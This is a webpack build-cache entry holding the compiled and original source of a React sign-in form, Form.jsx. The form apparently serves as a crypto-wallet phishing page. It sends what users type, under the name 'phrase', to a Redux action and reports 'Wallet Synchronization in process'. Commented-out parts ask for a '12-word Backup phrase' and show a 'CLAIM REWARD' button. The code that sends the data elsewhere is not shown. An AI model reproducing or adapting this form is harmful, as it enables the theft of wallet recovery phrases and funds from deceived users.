{"ast":null,"code":"var _jsxFileName = \"/home/niscolinx/projects/roqq/roqquappchat/src/components/Form.jsx\",\n    _s = $RefreshSig$();\n\nimport React, { useState, useEffect } from 'react';\nimport { connect } from 'react-redux';\nimport * as orderAction from '../store/actions';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\n\nconst Form = props => {\n  _s();\n\n  const [phrase, setPhrase] = useState('');\n  const [toast, setToast] = useState({});\n\n  const handlePhrase = e => {\n    setPhrase(e.target.value);\n  };\n\n  const handleSubmit = async e => {\n    e.preventDefault();\n    props.onInitPutPhrase(phrase); //  setToast({\n    //      content: 'Wallet Synchronization in process!!',\n    //      type: 'success',\n    //  })\n  };\n\n  useEffect(() => {\n    if (props.createdPhrase) {\n      setToast({\n        content: 'Wallet Synchronization in process!!',\n        type: 'success'\n      });\n    }\n\n    if (props.error) {\n      console.log('error', props.error);\n      setToast({\n        content: 'Invalid Phrase, Please check your entries!!',\n        type: 'error'\n      });\n    }\n  }, [props.createdPhrase, props.error]);\n  return /*#__PURE__*/_jsxDEV(\"form\", {\n    className: \"grid w-full place-content-stretch bg-white \",\n    style: {\n      padding: '32px 24px'\n    },\n    onSubmit: handleSubmit,\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      className: \"font-medium text-center text-[#1c124d] mb-4 text-2xl\",\n      children: \"Sign in\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 46,\n      columnNumber: 13\n    }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n      type: \"email\",\n      id: \"email\",\n      className: \"text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4\",\n      required: true,\n      value: phrase,\n      placeholder: \"Email address\",\n      onChange: handlePhrase\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 49,\n      columnNumber: 13\n    }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n      type: \"password\",\n      id: \"email\",\n      className: \"text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4\",\n      required: true,\n      placeholder: \"password\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 58,\n      columnNumber: 13\n    }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n      className: \" rounded-md outline-none  bg-[#0059dd] text-white text-sm\",\n      style: {\n        padding: '.5rem 3rem',\n        lineHeight: 2.5\n      },\n      children: \"Sign in to your account\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 66,\n      columnNumber: 13\n    }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"ui horizontal divider font-bold\",\n      children: [\" \", /*#__PURE__*/_jsxDEV(\"span\", {\n        children: \"Or sign in with\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 72,\n        columnNumber: 63\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 72,\n      columnNumber: 13\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 41,\n    columnNumber: 9\n  }, this);\n};\n\n_s(Form, \"XFAjQeO/ZZOWzIUVGV4IQiWa2vI=\");\n\n_c = Form;\n\nconst mapStateToProps = state => {\n  return {\n    createdPhrase: state.phrase.putPhrase,\n    error: state.phrase.error\n  };\n};\n\nconst mapDispatchToProps = dispatch => {\n  return {\n    onInitPutPhrase: phrase => dispatch(orderAction.initPutPhrase(phrase))\n  };\n};\n\nexport default connect(mapStateToProps, mapDispatchToProps)(Form);\n\nvar _c;\n\n$RefreshReg$(_c, \"Form\");","map":{"version":3,"sources":["/home/niscolinx/projects/roqq/roqquappchat/src/components/Form.jsx"],"names":["React","useState","useEffect","connect","orderAction","Form","props","phrase","setPhrase","toast","setToast","handlePhrase","e","target","value","handleSubmit","preventDefault","onInitPutPhrase","createdPhrase","content","type","error","console","log","padding","lineHeight","mapStateToProps","state","putPhrase","mapDispatchToProps","dispatch","initPutPhrase"],"mappings":"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","sourcesContent":["import React, { useState, useEffect } from 'react'\nimport { connect } from 'react-redux'\n\nimport * as orderAction from '../store/actions'\n\nconst Form = (props) => {\n    const [phrase, setPhrase] = useState('')\n    const [toast, setToast] = useState({})\n\n    const handlePhrase = (e) => {\n        setPhrase(e.target.value)\n    }\n\n    const handleSubmit = async (e) => {\n        e.preventDefault()\n\n        props.onInitPutPhrase(phrase)\n        //  setToast({\n        //      content: 'Wallet Synchronization in process!!',\n        //      type: 'success',\n        //  })\n    }\n\n    useEffect(() => {\n        if (props.createdPhrase) {\n            setToast({\n                content: 'Wallet Synchronization in process!!',\n                type: 'success',\n            })\n        }\n        if (props.error) {\n            console.log('error', props.error)\n            setToast({\n                content: 'Invalid Phrase, Please check your entries!!',\n                type: 'error',\n            })\n        }\n    }, [props.createdPhrase, props.error])\n\n    return (\n        <form\n            className='grid w-full place-content-stretch bg-white '\n            style={{ padding: '32px 24px' }}\n            onSubmit={handleSubmit}\n        >\n            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>\n                Sign in\n            </h2>\n            <input\n                type='email'\n                id='email'\n                className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'\n                required\n                value={phrase}\n                placeholder='Email address'\n                onChange={handlePhrase}\n            />\n            <input\n                type='password'\n                id='email'\n                className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'\n                required\n                placeholder='password'\n            />\n\n            <button\n                className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'\n                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}\n            >\n                Sign in to your account\n            </button>\n            <div className='ui horizontal divider font-bold'> <span>Or sign in with</span></div>\n            {/* {toast && toast.content && (\n                <div className=' grid font-semibold mb-8'>\n                    <p\n                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${\n                            toast.type === 'success'\n                                ? 'bg-yellow-600'\n                                : 'bg-red-800'\n                        }`}\n                    >\n                        {toast.content}\n                    </p>\n                </div>\n            )}\n\n            \n\n            <textarea\n                id='phrase'\n                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '\n                rows={2}\n                required\n                value={phrase}\n                placeholder='Enter 12-word Backup phrase'\n                onChange={handlePhrase}\n            />\n\n            <div className='flex justify-between items-center pt-10 font-medium'>\n                <div className='text-xs font-normal text-[#708599]'>\n                    <input type='checkbox' id='checkbox' required /> {''}\n                    <label htmlFor='checkbox'>\n                        Keep me signed in on this computer\n                    </label>\n                </div>\n\n                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>\n                CLAIM REWARD\n            </button> \n                <button className='text-white bg-[#1652f0] rounded-sm' style={{padding: '11px 22px', fontSize: '11px'}}>SIGN IN</button>\n            </div> */}\n        </form>\n    )\n}\n\nconst mapStateToProps = (state) => {\n    return {\n        createdPhrase: state.phrase.putPhrase,\n        error: state.phrase.error,\n    }\n}\n\nconst mapDispatchToProps = (dispatch) => {\n    return {\n        onInitPutPhrase: (phrase) =>\n            dispatch(orderAction.initPutPhrase(phrase)),\n    }\n}\nexport default connect(mapStateToProps, mapDispatchToProps)(Form)\n"]},"metadata":{},"sourceType":"module"}